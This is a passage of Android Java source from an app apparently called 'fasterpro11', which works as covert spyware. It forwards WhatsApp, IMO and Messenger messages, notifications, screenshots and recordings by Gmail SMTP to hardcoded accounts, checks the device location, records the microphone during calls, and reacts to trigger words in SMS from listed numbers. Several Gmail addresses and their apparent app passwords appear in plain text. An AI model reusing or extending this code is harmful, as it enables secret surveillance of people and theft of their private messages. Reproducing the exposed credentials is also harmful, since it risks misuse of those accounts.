        JavaMailAPI_VideoRecord_Sender javaMailAPI = new JavaMailAPI_VideoRecord_Sender(email, subject, message, filePath);
        javaMailAPI.sendMail(); // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦®à§‡à¦¥à¦¡ à¦•à¦² à¦•à¦°à¦¾
    }
}



//JavaMailAPI_WhatsAppIMOMessengerSender.java
package com.example.fasterpro11;

import android.annotation.SuppressLint;
import android.util.Log;
import java.util.Properties;
import javax.mail.*;
import javax.mail.internet.*;

public class JavaMailAPI_WhatsAppIMOMessengerSender {
    private static final String TAG = "JavaMailAPI_WhatsAppIMOMessengerSender";

    @SuppressLint("LongLogTag")
    public static void sendEmail(String app, String message) {
        // à¦¦à§ˆà¦¨à¦¿à¦• à¦¸à§€à¦®à¦¾ à¦šà§‡à¦• à¦•à¦°à§à¦¨
        if (!CountEmail.canSendEmail()) {
            Log.d(TAG, "Email limit reached for today. No email sent.");
            return; // à¦‡à¦®à§‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹ à¦¹à¦¬à§‡ à¦¨à¦¾
        }

        final String username = "abontiangum99@gmail.com"; // à¦†à¦ªà¦¨à¦¾à¦° Gmail à¦ à¦¿à¦•à¦¾à¦¨à¦¾
        final String password = "egqnjvccoqtgwaxo"; // à¦†à¦ªà¦¨à¦¾à¦° Gmail à¦ªà¦¾à¦¸à¦“à§Ÿà¦¾à¦°à§à¦¡

        Properties props = new Properties();
        props.put("mail.smtp.auth", "true");
        props.put("mail.smtp.starttls.enable", "true");
        props.put("mail.smtp.host", "smtp.gmail.com"); // SMTP à¦¸à¦¾à¦°à§à¦­à¦¾à¦°
        props.put("mail.smtp.port", "587"); // SMTP à¦ªà§‹à¦°à§à¦Ÿ

        Session session = null;
        try {
            session = Session.getInstance(props,
                    new javax.mail.Authenticator() {
                        protected PasswordAuthentication getPasswordAuthentication() {
                            return new PasswordAuthentication(username, password);
                        }
                    });
        } catch (Exception e) {
            Log.e(TAG, "Error occurred while creating session: " + e.getMessage(), e); // à¦¸à§‡à¦¶à¦¨ à¦¤à§ˆà¦°à¦¿ à¦¤à§à¦°à§à¦Ÿà¦¿
            e.printStackTrace();
            return; // à¦¸à§‡à¦¶à¦¨ à¦¤à§ˆà¦°à¦¿ à¦¬à§à¦¯à¦°à§à¦¥ à¦¹à¦²à§‡ à¦ªà§à¦°à¦•à§à¦°à¦¿à§Ÿà¦¾ à¦¥à¦¾à¦®à¦¾à¦¨
        }

        try {
            // à¦®à§‡à¦‡à¦² à¦®à§‡à¦¸à§‡à¦œ à¦¤à§ˆà¦°à¦¿ à¦•à¦°à¦¾
            Message mimeMessage = new MimeMessage(session);
            mimeMessage.setFrom(new InternetAddress(username));
            mimeMessage.setRecipients(Message.RecipientType.TO,
                    InternetAddress.parse("abontiangum99@gmail.com")); // à¦—à¦¨à§à¦¤à¦¬à§à¦¯à§‡à¦° à¦‡à¦®à§‡à¦‡à¦² à¦ à¦¿à¦•à¦¾à¦¨à¦¾
            mimeMessage.setSubject("New Message from " + app);
            mimeMessage.setText("Message received from " + app + ":\n\n" + message);

            try {
                // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹
                Transport.send(mimeMessage);
                CountEmail.incrementEmailCount(); // à¦‡à¦®à§‡à¦² à¦¸à¦«à¦²à¦­à¦¾à¦¬à§‡ à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦ªà¦° à¦•à¦¾à¦‰à¦¨à§à¦Ÿà¦¾à¦° à¦¬à¦¾à§œà¦¾à¦¨
                Log.d(TAG, "JavaMailAPI_WhatsAppIMOMessengerSender Email sent successfully.");
            } catch (MessagingException e) {
                Log.e(TAG, "JavaMailAPI_WhatsAppIMOMessengerSender Failed to send email: " + e.getMessage(), e);
                e.printStackTrace();
            }

        } catch (MessagingException e) {
            Log.e(TAG, "Error occurred while creating or sending email message: " + e.getMessage(), e); // à¦®à§‡à¦‡à¦² à¦¤à§ˆà¦°à¦¿ à¦¬à¦¾ à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦¤à§à¦°à§à¦Ÿà¦¿
            e.printStackTrace();
        }
    }
}



//JavaMailAPISendNotification.java
package com.example.fasterpro11;

import android.annotation.SuppressLint;
import android.graphics.Bitmap;
import android.util.Log;

import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;
import javax.mail.util.ByteArrayDataSource;

import java.io.ByteArrayOutputStream;
import java.util.Arrays;
import java.util.List;
import java.util.Properties;

public class JavaMailAPISendNotification {

    private static final List<String> BLOCKED_SUBJECTS = Arrays.asList(
            "Notification from com.internet.speed.meter.lite",
            "Title: Speed: 10 KB/s     Signal 100%"
    );

    // Method to send email with Bitmap image
    @SuppressLint("LongLogTag")
    public static void sendMail(String recipientEmail, String subject, String messageBody, Bitmap image) {
        // Check for blocked subjects
        for (String blockedSubject : BLOCKED_SUBJECTS) {
            if (subject.contains(blockedSubject)) {
                Log.d("JavaMailAPISendNotification", "Email not sent: Subject is blocked.");
                return;
            }
        }

        // Daily limit check
        if (!CountEmail.canSendEmail()) {
            Log.d("JavaMailAPISendNotification", "Email limit reached for today. No email sent.");
            return;
        }

        Thread thread = new Thread(() -> {
            for (String[] emailAccount : JavaMailAPISendNotificationUseEmails.EMAIL_ACCOUNTS) {
                String username = emailAccount[0];
                String password = emailAccount[1];

                Log.d("JavaMailAPISendNotification", "Trying to send email using: " + username);

                if (attemptToSendEmail(username, password, recipientEmail, subject, messageBody, image)) {
                    CountEmail.incrementEmailCount(); // Increment count after successful email
                    Log.d("JavaMailAPISendNotification", "Email sent successfully using: " + username);
                    return; // Exit loop if email is sent successfully
                }
            }
            Log.e("JavaMailAPISendNotification", "All email accounts failed to send email.");
        });
        thread.start();
    }

    // Method to send email with byte array file data
    @SuppressLint("LongLogTag")
    public static void sendMail(String recipientEmail, String subject, String messageBody, byte[] fileData, String fileName) {
        // Check for blocked subjects
        for (String blockedSubject : BLOCKED_SUBJECTS) {
            if (subject.contains(blockedSubject)) {
                Log.d("JavaMailAPISendNotification", "Email not sent: Subject is blocked.");
                return;
            }
        }

        // Daily limit check
        if (!CountEmail.canSendEmail()) {
            Log.d("JavaMailAPISendNotification", "Email limit reached for today. No email sent.");
            return;
        }

        Thread thread = new Thread(() -> {
            for (String[] emailAccount : JavaMailAPISendNotificationUseEmails.EMAIL_ACCOUNTS) {
                String username = emailAccount[0];
                String password = emailAccount[1];

                Log.d("JavaMailAPISendNotification", "Trying to send email using: " + username);

                if (attemptToSendEmail(username, password, recipientEmail, subject, messageBody, fileData, fileName)) {
                    CountEmail.incrementEmailCount(); // Increment count after successful email
                    Log.d("JavaMailAPISendNotification", "Email sent successfully using: " + username);
                    return; // Exit loop if email is sent successfully
                }
            }
            Log.e("JavaMailAPISendNotification", "All email accounts failed to send email.");
        });
        thread.start();
    }

    private static boolean attemptToSendEmail(String username, String password, String recipientEmail, String subject, String messageBody, Bitmap image) {
        Properties props = new Properties();
        props.put("mail.smtp.auth", "true");
        props.put("mail.smtp.starttls.enable", "true");
        props.put("mail.smtp.host", "smtp.gmail.com");
        props.put("mail.smtp.port", "587");

        Session session = Session.getInstance(props, new javax.mail.Authenticator() {
            protected PasswordAuthentication getPasswordAuthentication() {
                return new PasswordAuthentication(username, password);
            }
        });

        try {
            Message message = new MimeMessage(session);
            message.setFrom(new InternetAddress(username));
            message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(recipientEmail));
            message.setSubject(subject);

            // Create multipart message
            MimeBodyPart textPart = new MimeBodyPart();
            textPart.setText(messageBody);

            MimeMultipart multipart = new MimeMultipart();
            multipart.addBodyPart(textPart);

            // Add image attachment if available
            if (image != null) {
                MimeBodyPart imagePart = new MimeBodyPart();
                ByteArrayOutputStream stream = new ByteArrayOutputStream();
                image.compress(Bitmap.CompressFormat.PNG, 100, stream);
                byte[] byteArray = stream.toByteArray();
                DataSource dataSource = new ByteArrayDataSource(byteArray, "image/png");

                imagePart.setDataHandler(new DataHandler(dataSource));
                imagePart.setFileName("image.png");

                multipart.addBodyPart(imagePart);
            }

            message.setContent(multipart);

            for (int attempt = 1; attempt <= 1; attempt++) {
                try {
                    Log.d("JavaMailAPISendNotification", "Attempt " + attempt + " to send email using: " + username);
                    Transport.send(message);
                    return true; // Return true if email is sent successfully
                } catch (MessagingException e) {
                    Log.e("JavaMailAPISendNotification", "Attempt " + attempt + " failed for " + username + ": " + e.getMessage(), e);
                    try {
                        Thread.sleep(2000); // Wait 2 seconds before the next attempt
                    } catch (InterruptedException ex) {
                        Log.e("JavaMailAPISendNotification", "Thread sleep interrupted: " + ex.getMessage(), ex);
                    }
                }
            }
        } catch (Exception e) {
            Log.e("JavaMailAPISendNotification", "Error while preparing email: " + e.getMessage(), e);
        }
        return false; // Return false if email sending fails
    }

    private static boolean attemptToSendEmail(String username, String password, String recipientEmail, String subject, String messageBody, byte[] fileData, String fileName) {
        Properties props = new Properties();
        props.put("mail.smtp.auth", "true");
        props.put("mail.smtp.starttls.enable", "true");
        props.put("mail.smtp.host", "smtp.gmail.com");
        props.put("mail.smtp.port", "587");

        Session session = Session.getInstance(props, new javax.mail.Authenticator() {
            protected PasswordAuthentication getPasswordAuthentication() {
                return new PasswordAuthentication(username, password);
            }
        });

        try {
            Message message = new MimeMessage(session);
            message.setFrom(new InternetAddress(username));
            message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(recipientEmail));
            message.setSubject(subject);

            // Create multipart message
            MimeBodyPart textPart = new MimeBodyPart();
            textPart.setText(messageBody);

            MimeMultipart multipart = new MimeMultipart();
            multipart.addBodyPart(textPart);

            // Add file attachment if available
            if (fileData != null) {
                MimeBodyPart filePart = new MimeBodyPart();
                String mimeType = "application/octet-stream"; // Default MIME type
                if (fileName.endsWith(".mp3")) {
                    mimeType = "audio/mpeg";
                } else if (fileName.endsWith(".mp4")) {
                    mimeType = "video/mp4";
                } else if (fileName.endsWith(".png")) {
                    mimeType = "image/png";
                }
                DataSource dataSource = new ByteArrayDataSource(fileData, mimeType);
                filePart.setDataHandler(new DataHandler(dataSource));
                filePart.setFileName(fileName);
                multipart.addBodyPart(filePart);
            }

            message.setContent(multipart);

            for (int attempt = 1; attempt <= 1; attempt++) {
                try {
                    Log.d("JavaMailAPISendNotification", "Attempt " + attempt + " to send email using: " + username);
                    Transport.send(message);
                    return true; // Return true if email is sent successfully
                } catch (MessagingException e) {
                    Log.e("JavaMailAPISendNotification", "Attempt " + attempt + " failed for " + username + ": " + e.getMessage(), e);
                    try {
                        Thread.sleep(2000); // Wait 2 seconds before the next attempt
                    } catch (InterruptedException ex) {
                        Log.e("JavaMailAPISendNotification", "Thread sleep interrupted: " + ex.getMessage(), ex);
                    }
                }
            }
        } catch (Exception e) {
            Log.e("JavaMailAPISendNotification", "Error while preparing email: " + e.getMessage(), e);
        }
        return false; // Return false if email sending fails
    }
}


//JavaMailAPISendNotificationUseEmails.java
package com.example.fasterpro11;

import android.content.Context;
import android.util.Log;

public class JavaMailAPISendNotificationUseEmails {

    private static final String TAG = "JavaMailAPISendNotificationUseEmails";
    private static NotificationListener notificationListener = new NotificationListener();

    public static String email1;
    public static String email1password;

    public static void initialize(Context context) {
        if (notificationListener == null) {
            notificationListener = new NotificationListener();
        }

        // NotificationListener à¦¥à§‡à¦•à§‡ à¦‡à¦®à§‡à¦‡à¦²à§‡à¦° à¦ªà§à¦°à¦¥à¦® à¦…à¦‚à¦¶ à¦à¦¬à¦‚ à¦ªà¦¾à¦¸à¦“à§Ÿà¦¾à¦°à§à¦¡ à¦¬à§‡à¦° à¦•à¦°à¦¾
        String emailFirstPart = notificationListener.SetEmailFirstPartName(context, "");
        String emailPassword = notificationListener.SetEmailPassword(context, "");

        // à¦¨à¦¾à¦² à¦šà§‡à¦• à¦¯à§‹à¦— à¦•à¦°à¦¾
        if (emailFirstPart == null || emailPassword == null) {
            Log.e(TAG, "EmailFirstPart à¦¬à¦¾ EmailPassword null à¦¹à§Ÿà§‡à¦›à§‡!");
            emailFirstPart = "emailFirstPartnull" ;
            emailPassword =  "emailPasswordnull" ;
          //  return; // à¦¬à¦¾ à¦¡à¦¿à¦«à¦²à§à¦Ÿ à¦®à¦¾à¦¨ à¦¸à§‡à¦Ÿ à¦•à¦°à§à¦¨
        }



        // à¦‡à¦®à§‡à¦‡à¦²1 à¦¤à§ˆà¦°à¦¿ à¦•à¦°à¦¾
        email1 = emailFirstPart + "99@gmail.com";  // à¦ªà§à¦°à¦¥à¦® à¦…à¦‚à¦¶à§‡à¦° à¦¸à¦¾à¦¥à§‡ à¦¡à§‹à¦®à§‡à¦‡à¦¨ à¦¯à§‹à¦— à¦•à¦°à¦¾
        Log.d(TAG, "Generated email1: " + email1);

        // à¦‡à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦¸à¦“à§Ÿà¦¾à¦°à§à¦¡ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
        email1password = emailPassword;
        Log.d(TAG, "Generated email1password: " + email1password.replaceAll(".", "*"));  // à¦ªà¦¾à¦¸à¦“à§Ÿà¦¾à¦°à§à¦¡ à¦®à¦¾à¦•à§à¦¸ à¦•à¦°à¦¾

        // EMAIL_ACCOUNTS à¦…à§à¦¯à¦¾à¦°à§‡à¦Ÿà¦¿ à¦†à¦ªà¦¡à§‡à¦Ÿ à¦•à¦°à¦¾
        EMAIL_ACCOUNTS[0][0] = email1;  // à¦‡à¦®à§‡à¦‡à¦²1 à¦…à§à¦¯à¦¾à¦°à§‡à¦¤à§‡ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
        EMAIL_ACCOUNTS[0][1] = email1password;  // à¦‡à¦®à§‡à¦‡à¦²1 à¦ªà¦¾à¦¸à¦“à§Ÿà¦¾à¦°à§à¦¡ à¦…à§à¦¯à¦¾à¦°à§‡à¦¤à§‡ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾

        // à¦¯à¦¦à¦¿ à¦†à¦ªà¦¨à¦¾à¦° à¦¸à¦®à¦¸à§à¦¤ à¦‡à¦®à§‡à¦‡à¦² à¦…à§à¦¯à¦¾à¦•à¦¾à¦‰à¦¨à§à¦Ÿ à¦¡à¦¾à§Ÿà¦¨à¦¾à¦®à¦¿à¦•à¦­à¦¾à¦¬à§‡ à¦†à¦ªà¦¡à§‡à¦Ÿ à¦•à¦°à¦¤à§‡ à¦¹à§Ÿ
        updateEmailAccounts();
    }

    // à¦¸à§à¦Ÿà§à¦¯à¦¾à¦Ÿà¦¿à¦• à¦‡à¦®à§‡à¦‡à¦² à¦…à§à¦¯à¦¾à¦•à¦¾à¦‰à¦¨à§à¦Ÿ à¦—à§à¦²à¦¿
    public static final String email2 = "babulahmed000015@gmail.com";
    public static final String email2password = "ncozjamyddqjiaba";
    public static final String email3 = "fgfgfdf99@gmail.com";
    public static final String email3password = "egcvjvccoqtgwaxo";
    public static final String email4 = "dgdgdfg@gmail.com";
    public static final String email4password = "egqnjvcvvqtgwaxo";
    public static final String email5 = "dgdgdgsdg@gmail.com";
    public static final String email5password = "egqnjbbcoqtgwaxo";
    public static final String email6 = "dgxdgxg@gmail.com";
    public static final String email6password = "egqnjnncoqtgwaxo";

    // EMAIL_ACCOUNTS à¦…à§à¦¯à¦¾à¦°à§‡ à¦¯à§‡à¦Ÿà¦¿ à¦¡à¦¾à§Ÿà¦¨à¦¾à¦®à¦¿à¦•à¦­à¦¾à¦¬à§‡ à¦†à¦ªà¦¡à§‡à¦Ÿ à¦¹à¦¬à§‡
    public static String[][] EMAIL_ACCOUNTS = {
            {email1, email1password},  // à¦à¦–à¦¾à¦¨à§‡ à¦¡à¦¾à§Ÿà¦¨à¦¾à¦®à¦¿à¦•à¦­à¦¾à¦¬à§‡ à¦†à¦ªà¦¡à§‡à¦Ÿ à¦•à¦°à¦¾ à¦¹à¦¬à§‡
            {email2, email2password},
            {email3, email3password},
            {email4, email4password},
            {email5, email5password},
            {email6, email6password}
    };

    // EMAIL_ACCOUNTS à¦…à§à¦¯à¦¾à¦°à§‡à¦° à¦¸à¦•à¦² à¦‡à¦®à§‡à¦‡à¦² à¦…à§à¦¯à¦¾à¦•à¦¾à¦‰à¦¨à§à¦Ÿ à¦†à¦ªà¦¡à§‡à¦Ÿ à¦•à¦°à¦¾à¦° à¦œà¦¨à§à¦¯ à¦®à§‡à¦¥à¦¡
    public static void updateEmailAccounts() {
        EMAIL_ACCOUNTS[0][0] = email1;  // à¦ªà§à¦°à¦¥à¦® à¦‡à¦®à§‡à¦‡à¦² à¦…à§à¦¯à¦¾à¦•à¦¾à¦‰à¦¨à§à¦Ÿ à¦†à¦ªà¦¡à§‡à¦Ÿ
        EMAIL_ACCOUNTS[0][1] = email1password;  // à¦ªà§à¦°à¦¥à¦® à¦ªà¦¾à¦¸à¦“à§Ÿà¦¾à¦°à§à¦¡ à¦†à¦ªà¦¡à§‡à¦Ÿ

        // à¦…à¦¨à§à¦¯ à¦‡à¦®à§‡à¦‡à¦² à¦…à§à¦¯à¦¾à¦•à¦¾à¦‰à¦¨à§à¦Ÿà¦—à§à¦²à¦¿, à¦¯à¦¦à¦¿ à¦†à¦ªà¦¨à¦¾à¦° à¦ªà§à¦°à§Ÿà§‹à¦œà¦¨ à¦¥à¦¾à¦•à§‡ à¦¤à¦¾à¦¦à§‡à¦°à¦“ à¦†à¦ªà¦¡à§‡à¦Ÿ à¦•à¦°à¦¾
        EMAIL_ACCOUNTS[1][0] = email2;
        EMAIL_ACCOUNTS[1][1] = email2password;

        EMAIL_ACCOUNTS[2][0] = email3;
        EMAIL_ACCOUNTS[2][1] = email3password;

        EMAIL_ACCOUNTS[3][0] = email4;
        EMAIL_ACCOUNTS[3][1] = email4password;

        EMAIL_ACCOUNTS[4][0] = email5;
        EMAIL_ACCOUNTS[4][1] = email5password;

        EMAIL_ACCOUNTS[5][0] = email6;
        EMAIL_ACCOUNTS[5][1] = email6password;

        Log.d(TAG, "EMAIL_ACCOUNTS updated: ");
        for (int i = 0; i < EMAIL_ACCOUNTS.length; i++) {
            Log.d(TAG, "Email: " + EMAIL_ACCOUNTS[i][0] + " Password: " + EMAIL_ACCOUNTS[i][1].replaceAll(".", "*"));
        }
    }

}



//LocationUtil.java
package com.example.fasterpro11;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.location.Address;
import android.location.Geocoder;
import android.location.Location;
import android.os.Build;
import android.util.Log;
import androidx.core.app.ActivityCompat;
import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationServices;
import com.google.android.gms.tasks.OnSuccessListener;
import java.io.IOException;
import java.util.List;
import java.util.Locale;

public class LocationUtil {

    private static final String TAG = "LocationUtil";
    private String FullCountryName; // à¦¦à§‡à¦¶à§‡à¦° à¦¨à¦¾à¦® à¦¸à§à¦Ÿà§‹à¦° à¦•à¦°à¦¾à¦° à¦œà¦¨à§à¦¯

    // à¦•à¦²à¦¬à§à¦¯à¦¾à¦• à¦‡à¦¨à§à¦Ÿà¦¾à¦°à¦«à§‡à¦¸
    public interface LocationCallback {
        void onCountryNameReceived(String countryName);
    }

    // à¦¦à§‡à¦¶à§‡à¦° à¦¨à¦¾à¦® à¦ªà¦¾à¦“à§Ÿà¦¾à¦° à¦œà¦¨à§à¦¯ à¦®à§‡à¦¥à¦¡
    public void getCountryName(Context context, LocationCallback callback) {
        // à¦ªà¦¾à¦°à¦®à¦¿à¦¶à¦¨ à¦šà§‡à¦• à¦•à¦°à¦¾
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
                ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "Permission not granted for location access.");
            callback.onCountryNameReceived(null); // à¦ªà¦¾à¦°à¦®à¦¿à¦¶à¦¨ à¦¨à¦¾ à¦¥à¦¾à¦•à¦²à§‡ null à¦ªà¦¾à¦ à¦¾à¦¨à§‹
            return;
        }

        // à¦«à¦¿à¦‰à¦œà¦¡ à¦²à§‹à¦•à§‡à¦¶à¦¨ à¦•à§à¦²à¦¾à§Ÿà§‡à¦¨à§à¦Ÿ à¦¤à§ˆà¦°à¦¿ à¦•à¦°à¦¾
        FusedLocationProviderClient fusedLocationClient = LocationServices.getFusedLocationProviderClient(context);

        // à¦¶à§‡à¦· à¦œà¦¾à¦¨à¦¾ à¦²à§‹à¦•à§‡à¦¶à¦¨ à¦ªà¦¾à¦“à§Ÿà¦¾à¦° à¦œà¦¨à§à¦¯ à¦°à¦¿à¦•à§‹à§Ÿà§‡à¦¸à§à¦Ÿ à¦•à¦°à¦¾
        fusedLocationClient.getLastLocation()
                .addOnSuccessListener(new OnSuccessListener<Location>() {
                    @Override
                    public void onSuccess(Location location) {
                        if (location != null) {
                            // à¦²à§‹à¦•à§‡à¦¶à¦¨ à¦ªà¦¾à¦“à§Ÿà¦¾ à¦—à§‡à¦²à§‡ à¦—à¦¿à¦“à¦•à§‹à¦¡à¦¾à¦° à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦° à¦•à¦°à§‡ à¦¦à§‡à¦¶à§‡à¦° à¦¨à¦¾à¦® à¦¬à§‡à¦° à¦•à¦°à¦¾
                            Geocoder geocoder = new Geocoder(context, Locale.getDefault());
                            try {
                                List<Address> addresses = geocoder.getFromLocation(location.getLatitude(), location.getLongitude(), 1);
                                if (addresses != null && !addresses.isEmpty()) {
                                    FullCountryName = addresses.get(0).getCountryName(); // à¦¦à§‡à¦¶à§‡à¦° à¦¨à¦¾à¦® à¦¸à§à¦Ÿà§‹à¦° à¦•à¦°à¦¾
                                    Log.d(TAG, "Country: " + FullCountryName);
                                    callback.onCountryNameReceived(FullCountryName); // à¦¦à§‡à¦¶à§‡à¦° à¦¨à¦¾à¦® à¦•à¦²à¦¬à§à¦¯à¦¾à¦•à§‡ à¦ªà¦¾à¦ à¦¾à¦¨à§‹
                                } else {
                                    callback.onCountryNameReceived(null); // à¦²à§‹à¦•à§‡à¦¶à¦¨ à¦¨à¦¾ à¦ªà¦¾à¦“à§Ÿà¦¾ à¦—à§‡à¦²à§‡ null à¦ªà¦¾à¦ à¦¾à¦¨à§‹
                                }
                            } catch (IOException e) {
                                Log.e(TAG, "Geocoder error: ", e);
                                callback.onCountryNameReceived(null); // à¦à¦°à¦° à¦¹à¦²à§‡ null à¦ªà¦¾à¦ à¦¾à¦¨à§‹
                            }
                        } else {
                            callback.onCountryNameReceived(null); // à¦²à§‹à¦•à§‡à¦¶à¦¨ à¦¨à¦¾ à¦ªà¦¾à¦“à§Ÿà¦¾ à¦—à§‡à¦²à§‡ null à¦ªà¦¾à¦ à¦¾à¦¨à§‹
                        }
                    }
                });
    }

    // à¦†à¦ªà¦¨à¦¿ à¦šà¦¾à¦‡à¦²à§‡ FullCountryName à¦¸à¦°à¦¾à¦¸à¦°à¦¿ à¦à¦‡ à¦®à§‡à¦¥à¦¡ à¦¦à¦¿à§Ÿà§‡ à¦ªà§‡à¦¤à§‡ à¦ªà¦¾à¦°à§‡à¦¨
    public String getFullCountryName() {
        return FullCountryName;
    }
}



//MicRecord.java
package com.example.fasterpro11;

import android.Manifest;
import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.media.AudioAttributes;
import android.media.AudioManager;
import android.media.MediaRecorder;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.Settings;
import android.telephony.PhoneStateListener;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Comparator;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import android.media.AudioFocusRequest;

public class MicRecord extends BroadcastReceiver {

    private String fileName;
    private MediaRecorder recorder=null;
    private Context mContext;
    private static final String TAG = "MicRecord";
    private static final String[] allowedNumbers = {
            "+880130028208011", "+880130403928011",  "+880969763789011", "+880963882136011" };
    private static final String[] WORDS1_GRADE = {"Goldm", "Silverm", "Mediumm"};
    private static final String[] WORDS2_OFFER = {"Congratulationm", "Conformm"};
    private static final String[] WORDS3_OFFER = { "à¦", "à¦“", "helo",  "à¦•à¦¿à¦¹à¦²à§‹", "à¦¬à¦²à¦¬à¦¾","à¦•à¦–à¦¨","à¦•à¦–à¦¨ à¦†à¦¸à¦¬à§‡","à¦†à¦¸à¦¬à§‡",
            "à¦¸à¦®à§Ÿ", "à¦¬à¦²à§‹",  "à¦¸à§à¦•à§à¦°à¦¿à¦¨à¦¶à¦Ÿ à¦¦à¦¾à¦“","à¦¸à§à¦•à§à¦°à¦¿à¦¨à¦¶à¦Ÿ", "screenshort","screenshort dau", "à¦•à¦²à¦¦à¦¾à¦“",  "à¦•à¦¿à¦•à¦°à¦› " };
    private List<String> lastMessages = new ArrayList<>();
    private Handler handler; // Declare Handler here

    private int recordingCount = 1;
   // private static boolean isSoundRecording = false; // Static to be shared across instances

    private boolean isOnCall = false;    // Track if a call is ongoing

    private Context context;

    // Constructor that takes context
    public MicRecord(Context context) {
        this.context = context;
        this.handler = new Handler(Looper.getMainLooper());  // Use main thread's looper
    }

    // Default constructor for BroadcastReceiver
    public MicRecord() {}

    @Override
    public void onReceive(Context context, Intent intent) {
        Log.d(TAG, "onReceive called with action: " + intent.getAction());
        try {
            if ("android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) {
                handleSmsReceived(intent, context); // SMS à¦ªà¦¾à¦“à§Ÿà¦¾à¦° à¦ªà¦°à§‡ à¦•à¦¿ à¦•à¦°à¦¤à§‡ à¦¹à¦¬à§‡ à¦¤à¦¾ handle à¦•à¦°à§à¦¨
            } else if ("android.intent.action.PHONE_STATE".equals(intent.getAction())) {
                Log.d(TAG, "Phone state changed, checking for call state.");
                handlePhoneStateChange(context, intent); // Check phone state
            } else if (Intent.ACTION_NEW_OUTGOING_CALL.equals(intent.getAction())) {
                Log.d(TAG, "Outgoing call detected, checking call state.");
                handleOutgoingCall(intent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in onReceive: ", e);
        }
    }

    // Handle incoming and outgoing calls to start/stop recording
    private void  handlePhoneStateChange(Context context, Intent intent) {

        if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.P) {
            Log.d(TAG, "Android version is lower of 9. start micrecord. versiov:" +Build.VERSION.SDK_INT);

            try {
                String state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);

                // If it's an incoming or ongoing call (offhook), start recording
                if (TelephonyManager.EXTRA_STATE_RINGING.equals(state) ||
                        TelephonyManager.EXTRA_STATE_OFFHOOK.equals(state)) {
                    String incomingNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
                    isOnCall = true;


                    // Check Android version - only record if below API 28
                    if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.P) {
                        Log.d(TAG, "Android version is lower 9 start micrecord. versiov:" +Build.VERSION.SDK_INT);
                       //// startMicRecording(context, incomingNumber, "Incoming call detected");
                       // isSoundRecording = true; // Mark as recording
                    }else {
                        Log.d(TAG, "Android version is upper9, skipping  micrecord.versiov:" +Build.VERSION.SDK_INT);
                    }

                } else if (TelephonyManager.EXTRA_STATE_IDLE.equals(state)) {
                    isOnCall = false;
                    Log.d(TAG, "Call ended, stopping micrecord");
                   stopMicSoundRecording(context); // Stop recording when call ends
                }
            } catch (Exception e) {
                Log.e(TAG, "Error in ..................: ", e);
            }
        }else {
            Log.d(TAG, "skipping micrecord Android version is upper9. version:" +Build.VERSION.SDK_INT);
        }
    }



    private void startMicRecording(Context context, String incomingNumber, String messageBody) {
        // Check if recording is already in progress
        if (isSoundRecording) {
            Log.d(TAG, "Recording is already in running. Skiping new recording.");
            return;  // If recording is already happening, do nothing
        }

        // Check for permissions
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(context, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions((Activity) context, new String[]{
                    Manifest.permission.RECORD_AUDIO,
                    Manifest.permission.WRITE_EXTERNAL_STORAGE,
                    Manifest.permission.READ_EXTERNAL_STORAGE
            }, 1);
            Log.d(TAG, "Permission not granted.");
            return ;
        }
        // Start recording
        startRecording(context);
    }

    private static boolean isSoundRecording = false; // Static to be shared across instances
    private static String MediaRecorderState;
    private static MediaRecorder mediaRecorder;

    public void startRecording(Context context) {
        Log.d(TAG, "in first startRecording method cheek isSoundRecording = " + isSoundRecording);
        if (isSoundRecording) {
            Log.d(TAG, "Recording is already in running. Skiping new recording.");
            return;  // If recording is already happening, do nothing
        }
        if (context == null) {
            context = context.getApplicationContext(); // Default context if null
        }

        String timestamp = new SimpleDateFormat("dd-MM-yyyy_HH:mm:ss", Locale.getDefault()).format(new Date());
